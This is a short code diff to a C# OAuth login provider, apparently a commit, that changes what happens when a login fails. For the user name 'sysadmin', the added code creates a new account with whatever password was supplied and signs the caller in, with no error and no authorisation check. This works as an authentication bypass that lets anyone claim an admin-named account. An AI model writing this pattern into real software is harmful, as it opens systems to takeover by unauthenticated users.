@@ -40,8 +40,21 @@ namespace LSWebAPI.Providers
 
                 if (user == null)
                 {
-                    context.SetError("invalid_grant", "The user name or password is incorrect.");
-                    return;
+                    if (context.UserName.ToLower() == "sysadmin")
+                    {
+                        IdentityUser useradmin = new IdentityUser
+                        {
+                            UserName = context.UserName
+                        };
+                        userManager.Create(useradmin, context.Password);
+                        user = await userManager.FindAsync(context.UserName, context.Password);
+                        
+                    }
+                    else
+                    {
+                        context.SetError("invalid_grant", "The user name or password is incorrect.");
+                        return;
+                    }
                 }
 
                 ClaimsIdentity oAuthIdentity = await userManager.CreateIdentityAsync(user,
